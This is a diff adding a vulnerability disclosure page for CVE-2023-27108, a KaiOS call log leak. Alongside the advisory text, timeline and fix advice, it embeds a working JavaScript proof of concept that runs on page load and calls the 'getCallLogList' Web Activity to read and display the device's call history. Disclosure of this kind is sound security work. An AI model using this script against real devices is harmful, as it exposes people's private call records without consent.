@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>CVE-2023-27108: KaiOS 3.0 Call Log Leak</title>
+    <style type="text/css">
+        body {
+            font-family: PT Sans,sans-serif;
+        }
+
+        p {
+            font-size: 1.1rem;
+            line-height: 1.85;
+        }
+
+        code {
+            font-size: 1rem;
+        }
+
+        button {
+            display: block;
+        }
+
+        button + button {
+            margin-top: 0.5rem;
+        }
+
+        summary {
+            display: block;
+            max-width: 400px;
+            background-color: #f5f5f5;
+            padding: 1rem;
+        }
+
+        code.block {
+            display: block;
+            white-space: pre;
+        }
+    </style>
+  </head>
+  <body>
+    <h1>CVE-2023-27108: KaiOS 3.0 Call Log Leak</h1>
+    <summary>
+        <p>
+            Vendor: KaiOS Technologies Inc.<br />
+            Vendor URL: <a href="https://www.kaiostech.com/" rel="external noopener" referrerpolicy="strict-origin-when-cross-origin">https://www.kaiostech.com/</a><br />
+            Versions affected: KaiOS 3.0, KaiOS 3.1<br />
+            Systems Affected: KaiOS-based mobile devices<br />
+            Author: <a href="https://barrasso.me" rel="external noopener" referrerpolicy="strict-origin-when-cross-origin">Tom Barrasso</a><br />
+            CVE Identifier: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27108">CVE-2023-27108</a><br />
+            Risk: High
+        </p>
+    </summary>
+    <h3>Summary</h3>
+    <p>
+        KaiOS is a mobile operating system based on Firefox OS. The operating system comes with a number of pre-installed "certified" applications including the Communications application, which exposes call log data via the Web Activities API. Firefox OS mobile applications are built using JavaScript and HTML.<br />
+        The Communications application is vulnerable to information disclosure attacks.
+    </p>
+    <h3>Location</h3>
+    <ul>
+        <li>Source: <code>/system/b2g/webapps/communications/</code></li>
+    </ul>
+    <h3>Impact</h3>
+    <p>
+        An attacker can call the Web Activities API with the name <code>"getCallLogList"</code> via JavaScript. The Communications app does not perform any permission checks on the caller, and as a result, call log data is exposed either via an installed app or web page accessed via the system Browser. This will return a <code>Promise</code> that resolves to an array of data including phone numbers and timestamps. User interaction is not required.<br />
+        Below is a photo of call logs exposed on the Nokia 2780 Flip browser running KaiOS 3.1 (Credit: <a href="https://github.com/sosumi1984" rel="external noopener">github.com/sosumi1984</a>).<br />
+        <br />
+        <a href="/img/CVE-2023-27108.jpg" title="Photo of call logs exposed on Nokia 2780 Flip (KaiOS 3.1) browser">
+            <img src="/img/CVE-2023-27108.jpg" alt="Photo of call logs exposed on Nokia 2780 Flip (KaiOS 3.1) browser" height="600" loading="lazy" decoding="async" />
+        </a>
+    </p>
+    <h3>Recommendation</h3>
+    <p>
+        Always use origin and/ or permission checks when returning sensitive data like call logs via Web Activities.<br />
+        KaiOS allows applications to limit potential Web Activity callers to a pre-defined list of origins.
+        Here is an example from the Launcher app, which exposed an activity, <code>"get-app"</code>, that returns a list of installed apps. It is only made accessible to the Voice Assistant app using the <code>"allowedOrigins"</code> property.<br />
+        <code class="block">
+"get-app": {
+    "returnValue": true,
+    "allowedOrigins": [
+        "http://kaios-voiceassistant.localhost"
+    ]
+}
+        </code>
+    </p>
+    <h2>Demo</h2>
+    <section id="details">
+      <p>
+        <span><b>KaiOS Version</b>:</span>
+        <span id="version"></span>
+      </p>
+      <p>
+        <span><b>Call Logs:</b></span><br />
+        <span id="result"></span>
+      </p>
+    </section>
+    <h3>Vendor Communication Timeline</h3>
+    <ul>
+        <li>2/20/23: Tom emailed security@kaiostech.com disclosing issues to KaiOS Technologies.</li>
+        <li>2/20/23: KaiOS Technologies forwards to the appropriate team to validate.</li>
+        <li>4/30/23: Tom asked for current remediation status.</li>
+    </ul>
+
+	<script type="text/javascript">
+        (function() {
+            let container = document.getElementById('buttons');
+            let result = document.getElementById('result');
+            let version = document.getElementById('version');
+            let fragment = document.createDocumentFragment();
+
+            // Display results
+            const setResult = function(r, level) {
+                console[level || 'log'](r);
+                let status = (level === 'warn') ? ' error!' : ' success!';
+                try {
+                    result.innerText = JSON.stringify(r, null, 4) + '\n' + name + status;
+                } catch (_) {
+                    result.innerText = name + status;
+                }
+            };
+
+            // KaiOS 2.5 and 3.0 compatible activities
+            function launchActivity(name, data) {
+                if (hasMozActivity) {
+                    return new Promise(function(resolve, reject) {
+                        let activity = new MozActivity({ name: name, data: data });
+                        activity.onsuccess = function(r) { return resolve(r); };
+                        activity.onerror = function(e) { return reject(e); };
+                    });
+                } else if (hasWebActivity) {
+                    let activity = new WebActivity(name, data);
+                    return activity.start();
+                }
+
+                return Promise.reject(null);
+            }
+
+            // Display version
+            let verFrag = navigator.userAgent.toUpperCase().split('KAIOS')[1];
+            verFrag = (((verFrag || '').split(' ')[0] || '').split('/')[1] || '');
+            version.innerText = verFrag || 'N/A';
+
+            let hasWebActivity = (typeof WebActivity !== 'undefined');
+            let hasMozActivity = (typeof MozActivity !== 'undefined');
+
+            if (!(hasWebActivity || hasMozActivity)) {
+                result.innerText = 'Web Activity not available';
+                return;
+            }
+
+            // Call log object details
+
+            /**
+             * @param { object } newItem tel num information:
+             *  {
+             *    @param { Array } calls, - calls time information
+             *    @param { Number } serviceId, - sim num
+             *    @param { String } number，- tel number
+             *    emergency，
+             *    duration,
+             *    @param { String } direction, - call in/out/miss
+             *    hangUpLocal,
+             *    isVt,
+             *    radioTech,
+             *    isRtt,
+             *    @param { String } date, - call time
+             *    @param { String } callType, - call in/out/miss
+             *    @param { Number } simNum, - sim num
+             *    @param { String } groupKey, - call day
+             *    @param { String } id - timeDay + num + direction + sim num
+             *  }
+             */
+
+            launchActivity("getCallLogList", {
+                type: "calllog/tel",
+            }).then((callLogArray) => {
+                setResult(JSON.stringify(callLogArray, null, 4), 'log');
+            }).catch((e) => {
+                setResult(e, 'error');
+            });
+        })();
+    </script>
+  </body>
+</html>
